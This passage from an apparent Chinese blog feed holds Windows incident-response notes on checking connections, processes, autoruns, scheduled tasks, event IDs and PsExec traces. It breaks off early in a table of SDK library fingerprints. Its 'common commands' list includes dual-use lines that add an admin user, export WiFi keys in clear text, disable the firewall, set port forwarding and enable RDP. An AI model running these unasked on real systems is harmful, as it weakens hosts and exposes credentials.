：显示所有连接和侦听端口。</p><p>● -b ：显示在创建每个连接或侦听端口时涉及的可执行程序。在某些情况下，已知可执行程序承载多个独立的组件，这些情况下，显示创建连接或侦听端口时涉及的组件序列。在此情况下，可执行程序的名称位于底部 [] 中，它调用的组件位于顶部，直至达到 TCP&#x2F;IP。注意，此选项可能很耗时，并且在你没有足够权限时可能失败。</p><p>● -n ：以数字形式显示地址和端口号。</p><p>● -o ：显示拥有的与每个连接关联的进程 ID。</p><p>● -r ：显示路由表。</p><p>结合findstr命令查找特定的端口或程序</p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061646723.png" alt="img"></p><p>也可用命令的方式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">netstat -abno | find &quot;port number&quot;  查找固定端口号<br>tasklist | findstr PID    查找固定进程PID<br></code></pre></td></tr></table></figure><p>发现的感觉异常的 IP 地址可以在威胁情报平台上查询，如果是已知的恶意 IP，可以比较快速的确认攻击方式。</p><p>防火墙配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">netsh firewall show all<br></code></pre></td></tr></table></figure><p>win10自带的网络连接可参考<a href="https://betanews.com/2018/07/31/all-the-websites-windows-10-connects-to-clean-install/">These are all the websites Windows 10 connects to after a clean install</a></p><h3 id="3-检查进程"><a href="#3-检查进程" class="headerlink" title="3. 检查进程"></a>3. <strong>检查进程</strong></h3><p>进程通常结合网络查看异常，先检查异常的网络连接，再获取由哪个进程生成的网络连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">netstat -abno | find &quot;port number&quot;<br><br>tasklist | findstr PID<br></code></pre></td></tr></table></figure><p>使用 wmic 命令获取进程信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">wmic process | find &quot;Proccess Id&quot; &gt; proc.csv<br><br>Get-WmiObject -Class Win32_Process<br><br>Get-WmiObject -Query  &quot;select * from win32_service where name=&#x27;WinRM&#x27;&quot; -ComputerName Server01, Server02 | Format-List -Property PSComputerName, Name, ExitCode, Name, ProcessID, StartMode, State, Status<br></code></pre></td></tr></table></figure><p>PowerShell 的其他关于进程和网络的命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plain">Get-Process<br><br>Get-NetTCPConnection<br>Get-NetTCPConnection -State Established<br><br># 进程跟服务的对应关系<br>tasklist /svc<br></code></pre></td></tr></table></figure><p>使用 SysinternalsSuite 的 procexp 可以获取进程比较详细的信息，比如真实路径、加载的 DLL 文件等、CPU 和内存使用情况等。</p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061646983.png" alt="img"></p><h3 id="4-检查启动项，计划任务，服务。"><a href="#4-检查启动项，计划任务，服务。" class="headerlink" title="4.检查启动项，计划任务，服务。"></a><strong>4.检查启动项，计划任务，服务。</strong></h3><h4 id="4-1启动项相关"><a href="#4-1启动项相关" class="headerlink" title="4.1启动项相关"></a><strong>4.1启动项相关</strong></h4><p>关于开机启动需要分析的位置：</p><p>● 注册表中的关于开机启动的位置HKLM\Software\Microsoft\Windows\CurrentVersion\Runonce</p><p>○ HKLM\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run</p><p>○ HKLM\Software\Microsoft\Windows\CurrentVersion\Run</p><p>○ HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Run</p><p>○ HKCU\Software\Microsoft\Windows\CurrentVersion\Run</p><p>○ HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce</p><p>○ (ProfilePath)\Start Menu\Programs\Startup</p><p>● 开始菜单，启动项里（C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup）</p><p>● 任务管理器，启动选项卡，或者运行 msconfig，查看启动选项卡</p><p>● 运行gpedit.msc在本地组策略编辑器里查看开机运行脚本，包括计算机配置和用户配置的。</p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061646009.png" alt="img"></p><p>使用 SysinternalsSuite 工具集的 Autoruns 工具查看开机启动项目</p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061646025.png" alt="img"></p><h4 id="4-2查看服务状态"><a href="#4-2查看服务状态" class="headerlink" title="4.2查看服务状态"></a><strong>4.2查看服务状态</strong></h4><p>查看服务：services.msc</p><h4 id="4-3检查计划任务"><a href="#4-3检查计划任务" class="headerlink" title="4.3检查计划任务"></a><strong>4.3检查计划任务</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">C:\Windows\System32\Tasks\<br>C:\Windows\SysWOW64\Tasks\<br>C:\Windows\tasks\<br>*.job（指文件）<br></code></pre></td></tr></table></figure><p>使用命令查看计划任务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">schtasks<br></code></pre></td></tr></table></figure><p>运行<a href="http://taskschd.msc/">taskschd.msc</a>打开计划任务面板，或者从计算机管理进入，直接查看计划任务。</p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061646050.png" alt="img"></p><p>也可以使用 SysinternalsSuite 工具集的 Autoruns 工具查看计划任务。</p><h2 id="三-文件检查"><a href="#三-文件检查" class="headerlink" title="三.文件检查"></a><strong>三.文件检查</strong></h2><p>检查可疑文件的思路，一种是通过可疑进程（CPU 利用率、进程名）关联的文件，一种是按照时间现象关联的文件，文件大小也可以 作为辅助的判断方法，文件的操作可以使用Get-ChildItem命令查看。需要关注的文件位置:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs plain">下载目录<br>回收站文件<br>程序临时文件<br>历史文件记录<br>应用程序打开历史<br>搜索历史<br>快捷方式（LNK）<br>驱动<br>进程 DLL 的关联查询<br>共享文件<br>最近的文件（%UserProfile%\Recent）<br>文件更新<br>已安装文件<br></code></pre></td></tr></table></figure><h3 id="1-temp临时文件"><a href="#1-temp临时文件" class="headerlink" title="1.temp临时文件"></a><strong>1.temp临时文件</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plain">cmd %temp%打开临时文件<br><br>打开文件查看是否有PE文件（exe，dll，sys），或者是否有较大的tmp文件。<br><br>tem文件为临时文件，临时文件在对应的目录下是具有可读可写可访问等权限的，一些恶意代码非常喜欢利用tmp文件。<br><br>不清楚丢沙箱分析。<br></code></pre></td></tr></table></figure><h3 id="2-浏览器回收站记录排查"><a href="#2-浏览器回收站记录排查" class="headerlink" title="2.浏览器回收站记录排查"></a><strong>2.浏览器回收站记录排查</strong></h3><p>有可能黑客为了扩大对服务器的控制会让服务器访问他设置的病毒网址，先看有没有可疑的浏览器记录，在看有可疑的下载记录，前面两种容易被删除，之后再看不容易删除的cookie有没有可疑网站的cookie。</p><p>还有可能会把东西删掉，但是忘记删回收站。</p><h3 id="3-最近打开文件"><a href="#3-最近打开文件" class="headerlink" title="3.最近打开文件"></a><strong>3.最近打开文件</strong></h3><p>cmd输入%UserProfile%\Recent</p><h3 id="4-修改时间在创建时间之前的文件"><a href="#4-修改时间在创建时间之前的文件" class="headerlink" title="4.修改时间在创建时间之前的文件"></a><strong>4.修改时间在创建时间之前的文件</strong></h3><h3 id="5-文件在线扫描网站"><a href="#5-文件在线扫描网站" class="headerlink" title="5. 文件在线扫描网站"></a>5. <strong>文件在线扫描网站</strong></h3><p><a href="https://www.virscan.org/">VirScan - 多引擎文件在线检测平台</a></p><p><a href="https://habo.qq.com/">腾讯哈勃分析系统</a></p><p><a href="https://virusscan.jotti.org/">Jotti’s malware scan</a></p><p><a href="https://virusscan.jotti.org/">Jotti’s malware scan</a></p><h2 id="四-日志分析"><a href="#四-日志分析" class="headerlink" title="四.日志分析"></a><strong>四.日志分析</strong></h2><h3 id="1-日志目录"><a href="#1-日志目录" class="headerlink" title="1. 日志目录"></a>1. <strong>日志目录</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs plain">Windows 2000 / Server2003 / Windows XP 的日志目录<br>\%SystemRoot%\System32\Config\*.evt<br><br>Windows Vista / 7 / 10 / Server2008 的日志目录<br>\%SystemRoot%\System32\winevt\Logs\*.evtx<br><br>系统日志（System.evtx）：驱动程序、系统组件和应用软件的崩溃以及数据丢失错误等<br>默认位置： %SystemRoot%\System32\Winevt\Logs\System.evtx<br><br>应用程序日志（Application.evtx）：记录程序运行方面的事件<br>默认位置：%SystemRoot%\System32\Winevt\Logs\Application.evtx<br><br>安全日志（Security.evtx）：登录日志、对象访问日志、进程追踪日志、特权使用、帐号管理、策略变更、系统事件。安全日志也是调查取证中最常用到的日志。默认设置下，安全性日志是关闭的，管理员可以使用组策略来启动安全性日志，或者在注册表中设置审核策略，以便当安全性日志满后使系统停止响应<br>默认位置：%SystemRoot%\System32\Winevt\Logs\Security.evtx<br></code></pre></td></tr></table></figure><h3 id="2-常见事件ID"><a href="#2-常见事件ID" class="headerlink" title="2. 常见事件ID"></a>2. <strong>常见事件ID</strong></h3><table><thead><tr><th><strong>Event ID(2000&#x2F;XP&#x2F;2003)</strong></th><th><strong>Event ID(Vista&#x2F;7&#x2F;8&#x2F;2008&#x2F;2012)</strong></th><th><strong>描述</strong></th><th><strong>日志名称</strong></th></tr></thead><tbody><tr><td>528</td><td>4624</td><td>成功登录</td><td>Security</td></tr><tr><td>529</td><td>4625</td><td>失败登录</td><td>Security</td></tr><tr><td>680</td><td>4776</td><td>成功&#x2F;失败的账户认证</td><td>Security</td></tr><tr><td>624</td><td>4720</td><td>创建用户</td><td>Security</td></tr><tr><td>636</td><td>4732</td><td>添加用户到启用安全性的本地组中</td><td>Security</td></tr><tr><td>632</td><td>4728</td><td>添加用户到启用安全性的全局组中</td><td>Security</td></tr><tr><td>2934</td><td>7030</td><td>服务创建错误</td><td>System</td></tr><tr><td>2944</td><td>7040</td><td>IPSEC服务服务的启动类型已从禁用更改为自动启动</td><td>System</td></tr><tr><td>2949</td><td>7045</td><td>服务创建</td><td></td></tr></tbody></table><table><thead><tr><th><strong>登录类型</strong></th><th><strong>登录类型</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td>2</td><td>Interactive</td><td>用户登录到本机</td></tr><tr><td>3</td><td>Network</td><td>用户或计算手机从网络登录到本机，如果网络共享，或使用 net use 访问网络共享，net view 查看网络共享</td></tr><tr><td>4</td><td>Batch</td><td>批处理登录类型，无需用户干预</td></tr><tr><td>5</td><td>Service</td><td>服务控制管理器登录</td></tr><tr><td>7</td><td>Unlock</td><td>用户解锁主机</td></tr><tr><td>8</td><td>NetworkCleartext</td><td>用户从网络登录到此计算机，用户密码用非哈希的形式传递</td></tr><tr><td>9</td><td>NewCredentials</td><td>进程或线程克隆了其当前令牌，但为出站连接指定了新凭据</td></tr><tr><td>10</td><td>Remotelnteractive</td><td>使用终端服务或远程桌面连接登录</td></tr><tr><td>11</td><td>Cachedlnteractive</td><td>用户使用本地存储在计算机上的凭据登录到计算机（域控制器可能无法验证凭据），如主机不能连接域控，以前使用域账户登录过这台主机，再登录就会产生这样日志</td></tr><tr><td>12</td><td>CachedRemotelnteractive</td><td>与 Remotelnteractive 相同，内部用于审计目的</td></tr><tr><td>13</td><td>CachedUnlock</td><td>登录尝试解锁</td></tr></tbody></table><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061646109.png" alt="img"></p><p>查看 PowerShell 的日志</p><p>Microsoft-&gt;Windows-&gt;PowerShell-&gt;OPtions</p><h3 id="3-远程登录事件"><a href="#3-远程登录事件" class="headerlink" title="3.远程登录事件"></a><strong>3.远程登录事件</strong></h3><p>攻击者可能造成的远程登录事件</p><p><strong>RDP</strong></p><p>攻击者使用 RDP 远程登录受害者计算机，源主机和目的主机都会生成相应事件。重要的事件 ID（安全日志，Security.evtx）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">4624：账户成功登录<br>4648：使用明文凭证尝试登录<br>4778：重新连接到一台 Windows 主机的会话<br>4779：断开到一台 Windows 主机的会话<br></code></pre></td></tr></table></figure><p>远程连接日志（应用程序和服务日志-&gt;Microsoft-&gt;Windows-&gt;-TerminalServices-&gt;RemoteConnectionManager-&gt;Operational），重要事件 ID 和含义：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">1149：用户认证成功<br>21：远程桌面服务：会话登录成功<br>24：远程桌面服务：会话已断开连接<br>25：远程桌面服务：会话重新连接成功<br></code></pre></td></tr></table></figure><p>远程连接日志关注 RemoteInteractive（10） 和CachedRemoteInteractive（12）表明使用了 RDP ，因为这些登录类型专用于RDP使用。</p><h3 id="4-计划任务和-AT"><a href="#4-计划任务和-AT" class="headerlink" title="4.计划任务和 AT"></a><strong>4.计划任务和 AT</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs plain">关注的事件 ID4624：账户成功登录<br>计划任务事件 Microsoft-Windows-TaskScheduler/Operational.evtx，计划任务 ID 含义：<br>100：任务已开始<br>102：任务完成<br>106：已注册任务（关注点）<br>107：在调度程序上触发任务<br>110：用户触发的任务<br>129：创建任务流程（推出）<br>140：任务已更新<br>141：任务已删除<br>200：运行计划任务<br>325：启动请求排队<br>统一后台进程管理器（UBPM）<br>服务控制管理器 - 管理 Windows 服务<br>任务计划程序 - 管理 Windows 任务<br>Windows Management Instrumentation - 管理 WMI 供应商<br>DCOM Server Process Launcher - 管理进程外 COM 应用程序<br></code></pre></td></tr></table></figure><h3 id="5-PSExec"><a href="#5-PSExec" class="headerlink" title="5.PSExec"></a><strong>5.PSExec</strong></h3><p>PSExec是系统管理员的远程命令执行工具，包含在“Sysinternals Suite”工具中，但它通常也用于针对性攻击的横向移动。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs plain">PsExec的典型行为在具有网络登录（类型3）的远程计算机上将 PsExec 服务执行文件（默认值：PSEXESVC.exe）复制到％SystemRoot％。<br>如果使用-c选项，则通过 $Admin 共享将文件复制到 ％SystemRoot％ 执行命令。<br>注册服务（默认值：PSEXESVC），并启动服务以在远程计算机上执行该命令。<br>停止服务（默认值：PSEXESVC），并在执行后删除远程计算机上的服务。<br>PSExec选项的重要选项：<br>-r更改复制的文件名和远程计算机的服务名称<br>（默认值：％SystemRoot％\ PSEXESVC.exe和PSEXESVC）-s由SYSTEM帐户执行。<br>-C将程序复制到远程计算机<br>被复制到Admin$（％SystemRoot％）<br>-u使用特定凭据登录到远程计算机<br>生成登录类型2和登录类型3 的事件<br>可以从System.evtx中查找事件 ID 7045 发现 PSExec，相关的事件 ID<br>Security.evtx4624：帐户已成功登录<br>Ssystem.evtx7045：系统中安装了服务<br></code></pre></td></tr></table></figure><p>PsExec在执行命令时在远程主机上创建服务，默认服务名称为PSEXESVC，配合检测系统 7045 事件可以确定。</p><p>如果使用-r参数更改了默认的服务名称，通过以下特征可以检测 PSExec 的执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">PSExec服务执行文件（默认值：PSEXESVC.exe）被复制到远程计算机上的“％SystemRoot％”目录中<br>服务名称与没有“.exe”扩展名的执行名称相同<br>服务以“用户模式”执行，而不是“内核模式”<br>“LocalSystem”帐户用于服务帐户<br>实际帐户用于执行服务执行文件，而不是“SYSTEM”<br></code></pre></td></tr></table></figure><h3 id="6-PowerShell-日志操作"><a href="#6-PowerShell-日志操作" class="headerlink" title="6. PowerShell 日志操作"></a><strong>6. PowerShell 日志操作</strong></h3><p>使用Get-WinEvent</p><p>Get-WinEvent**@{<strong>logname</strong>&#x3D;<strong>‘application’</strong>,<strong>‘system’</strong>}**-MaxEvents1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">Get-WinEvent @&#123;logname=&#x27;application&#x27;,&#x27;system&#x27;&#125; -MaxEvents 1<br></code></pre></td></tr></table></figure><p>一些常见日志操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs plain"># Get-WinEvent帮助命令<br>get-help Get-WinEvent<br><br># 列出所有事件日志<br>Get-WinEvent -ListLog *<br><br># powershell管理员权限下获取安全事件日志<br>Get-WinEvent -FilterHashtable @&#123;LogName=&#x27;Security&#x27;&#125;<br><br># 过滤安全事件ID 4624<br>Get-WinEvent -FilterHashtable @&#123;LogName=&#x27;Security&#x27;;ID=&#x27;4624&#x27;&#125;<br><br># 查询今天的应用和系统日志，显示前2条<br>Get-WinEvent @&#123;logname=&#x27;application&#x27;,&#x27;system&#x27;;starttime=[datetime]::today &#125; -MaxEvents 2<br><br># 根据ID查询事件<br>Get-WinEvent -LogName Microsoft-Windows-PowerShell/Operational | Where-Object &#123;$_.ID -eq &quot;4100&quot; -or $_.ID -eq &quot;4104&quot;&#125;<br><br><br># 查询指定时间内的事件<br>$StartTime=Get-Date  -Year  2017  -Month  1  -Day  1  -Hour  15  -Minute  30<br>$EndTime=Get-Date  -Year  2017  -Month  2  -Day  15  -Hour  20  -Minute  00<br><br>Get-WinEvent -FilterHashtable @&#123;LogName=&#x27;System&#x27;;StartTime=$StartTime;EndTime=$EndTime&#125;<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061646138.png" alt="img"></p><p>Get-EventLog 的使用可以参考：<a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-eventlog?view=powershell-5.1">Get-EventLog (Microsoft.PowerShell.Management) - PowerShell | Microsoft Learn</a></p><h2 id="五-常用命令"><a href="#五-常用命令" class="headerlink" title="五.常用命令"></a><strong>五.常用命令</strong></h2><h3 id="1-net相关"><a href="#1-net相关" class="headerlink" title="1. net相关"></a>1. <strong>net相关</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs plain">查看域中当前的主机列表：<br>net view /domain<br><br>查看当前域中的用户<br>net user /domain<br><br>增加一个本地用户<br>net user username password /add<br><br>将新增的用户加到本地管理员组<br>net localgroup &quot;Administrators&quot; username /add<br><br>查看域中的密码策略<br>net accounts /domain<br><br>查看本地组<br>net localgroup &quot;Group&quot;<br><br>查看域中的组信息<br>net group /domain<br><br>查看域中指定组的成员<br>net group &quot;Domain group&quot; /domain<br><br>查看当前机器所在的域名<br>net config workstation<br><br>查看当前服务器所在的域名<br>net config server<br></code></pre></td></tr></table></figure><h3 id="2-系统显示相关"><a href="#2-系统显示相关" class="headerlink" title="2. 系统显示相关"></a>2. <strong>系统显示相关</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs plain">显示系统信息<br>systeminfo<br><br>查看远程主机的系统信息<br>systeminfo /S ip /U domain\user /P Pwd<br><br>显示进程和服务信息<br>tasklist /svc<br><br>显示所有进程以及DLL信息<br>tasklist /m<br><br>显示进程和所有者<br>tasklist /v<br><br>查看远程主机的进程列表<br>tasklist /S ip /v<br><br>显示具体的服务信息（包括二进制路径和运行使用）<br>sc qc Spooler<br></code></pre></td></tr></table></figure><h3 id="3-网络信息"><a href="#3-网络信息" class="headerlink" title="3. 网络信息"></a>3. <strong>网络信息</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs plain">打印路由表<br>route print<br><br>保存当前主机上的所有WiFi信息<br>netsh wlan export profile folder=. key=clear<br><br>设置当前配置禁用防火墙<br>netsh advfirewall set currentprofile state off<br><br>设置端口转发<br>netsh interface portproxy add v4tov4 listenport=3000 listenaddress=l.l.l.l connectport=4000 connectaddress=2.2.2.2<br><br>启用远程访问<br>reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f<br><br>启用远程协助<br>reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fAllowToGetHelp /t REG_DWORD /d 1 /f<br><br>修改远程访问端口<br>reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber /t REG_DWORD /d 12345 /f<br></code></pre></td></tr></table></figure><h2 id="六-常用工具"><a href="#六-常用工具" class="headerlink" title="六.常用工具"></a><strong>六.常用工具</strong></h2><h3 id="1-autoruns"><a href="#1-autoruns" class="headerlink" title="1.autoruns"></a><strong>1.autoruns</strong></h3><p>可以方便的查看自启动、计划任务和运行服务，通过关联右键菜单可以获取更详细的内容。</p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061646284.png" alt="img"></p><h3 id="2-procexp"><a href="#2-procexp" class="headerlink" title="2.procexp"></a><strong>2.procexp</strong></h3><p>查看进程的工具。</p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061646385.png" alt="img"></p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061646407.png" alt="img"></p><h3 id="3-ADExplorer"><a href="#3-ADExplorer" class="headerlink" title="3.ADExplorer"></a><strong>3.ADExplorer</strong></h3><p>Active Directory Explorer（AD Explorer）是一种高级Active Directory（AD）查看器和编辑器。 您可以使用AD Explorer轻松导航AD数据库，定义收藏位置，查看对象属性和属性，而无需打开对话框，编辑权限，查看对象的架构，以及执行可以保存和重新执行的复杂搜索。</p><p>AD Explorer还包括保存AD数据库快照以进行脱机查看和比较的功能。 加载已保存的快照时，您可以像实时数据库一样导航和浏览它。 如果您有两个AD数据库快照，则可以使用AD Explorer的比较功能查看它们之间更改的对象，属性和安全权限。</p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061646428.png" alt="img"></p><h3 id="4-TCPView"><a href="#4-TCPView" class="headerlink" title="4.TCPView"></a><strong>4.TCPView</strong></h3><p>查看网络连接情况</p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061646462.png" alt="img"></p><h3 id="5-PSExec-1"><a href="#5-PSExec-1" class="headerlink" title="5.PSExec"></a><strong>5.PSExec</strong></h3><p>像Telnet这样的实用程序和Symantec的PC Anywhere等远程控制程序允许您在远程系统上执行程序，但是设置起来很麻烦，并且要求您在要访问的远程系统上安装客户端软件。 PsExec是一种轻量级的 telne t替代品，可让您在其他系统上执行进程，完成控制台应用程序的完全交互，而无需手动安装客户端软件。 PsExec最强大的用途包括在远程系统上启动交互式命令提示和IpConfig等远程启用工具，否则它们无法显示有关远程系统的信息。</p><p>使用可以参考：<a href="https://www.itprotoday.com/management-mobility/psexec">PsExec | ITPro Today: IT News, How-Tos, Trends, Case Studies, Career Tips, More</a></p><h3 id="6-LogonSessions"><a href="#6-LogonSessions" class="headerlink" title="6.LogonSessions"></a><strong>6.LogonSessions</strong></h3><p>列出了当前活动的登录会话，如果指定-p选项，则列出每个会话中运行的进程。</p><p><img src="/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%AC%94%E8%AE%B0.assets/1704820398676-cbf7ce2f-063f-4c1d-a8ba-23c2fb44497f.png" alt="img"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>sdk指纹汇总</title>
    <link href="/2025/01/06/sdk%E6%8C%87%E7%BA%B9%E6%B1%87%E6%80%BB/"/>
    <url>/2025/01/06/sdk%E6%8C%87%E7%BA%B9%E6%B1%87%E6%80%BB/</url>
    
    <content type="html"><![CDATA[<table><thead><tr><th>label</th><th>name</th></tr></thead><tbody><tr><td>信鸽推送</td><td>libxguardian.so</td></tr><tr><td>Mars</td><td>libmarsxlog.so</td></tr><tr><td>xCrash</td><td>libxcrash.so</td></tr><tr><td>Weex</td><td>libweexjss.so</td></tr><tr><td>Pangle SDK</td><td>libfile_lock_pg.so</td></tr><tr><td>MNN</td><td>libMNN_CL.so</td></tr><tr><td>小米更新 SDK</td><td>libsdk_patcher_jni.so</td></tr><tr><td>HUAWEI AR Engine</td><td>libhuawei_arengine_impl.so</td></tr><tr><td>Fresco</td><td>libnative-imagetranscoder.so</td></tr><tr><td>Yoga</td><td>liblib_fb_fbjni.so</td></tr><tr><td>Bugly</td><td>libBugly.so</td></tr><tr><td>React Native</td><td>libreactnativejnifb.so</td></tr><tr><td>AndFix</td><td>libandfix.so</td></tr><tr><td>Fresco</td><td>libnative-filters.so</td></tr><tr><td>Bugly</td><td>libBugly-rqd.so</td></tr><tr><td>DuMix</td><td>libImgRecognition.so</td></tr><tr><td>Facebook SDK</td><td>libfb.so</td></tr><tr><td>GPUImage</td><td>libgpuimage-library.so</td></tr><tr><td>Fresco</td><td>libwebpimage.so</td></tr><tr><td>React Native</td><td>libjsinspector.so</td></tr><tr><td>Yoga</td><td>libyoga.so</td></tr><tr><td>SQLCipher</td><td>libsqlcipher.so</td></tr><tr><td>腾讯云直播 SDK</td><td>libsaturn.so</td></tr><tr><td>腾讯云通信 SDK</td><td>libqalcodecwrapper.so</td></tr><tr><td>Fresco</td><td>libimagepipeline.so</td></tr><tr><td>腾讯云短视频 SDK</td><td>libtxplayer.so</td></tr><tr><td>TensorFlow 